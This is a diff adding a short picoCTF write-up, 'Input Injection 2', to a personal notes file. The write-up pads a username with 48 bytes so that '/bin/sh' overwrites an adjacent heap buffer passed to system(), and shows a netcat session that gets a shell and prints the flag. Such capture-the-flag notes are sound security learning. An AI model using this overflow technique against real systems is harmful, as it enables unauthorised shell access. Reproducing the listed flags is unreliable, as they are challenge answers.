@@ -247,3 +247,16 @@ Goodbye, AAAAAAAAAA cat flag.txt!
 picoCTF{0v3rfl0w_c0mm4nd_a9259e7a}%
 shaunak@Shaunaks-MacBook-Pro ~ % 
 ```
+# Input Injection 2
+the challenge provides a c program that prints heap addresses for two variables, username and shell, and then prompts for a username. the program eventually executes system(shell).
+the difference between the two addresses is 3x16=48 bytes, so i just put /bin/sh after 48 bytes
+```
+shaunak@Shaunaks-MacBook-Pro ~ % nc amiable-citadel.picoctf.net 49705
+username at 0x266de2a0
+shell at 0x266de2d0
+Enter username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh
+ls
+flag.txt
+cat flag.txt
+picoCTF{us3rn4m3_2_sh3ll_48b038ff}%                                             shaunak@Shaunaks-MacBook-Pro ~ % 
+```
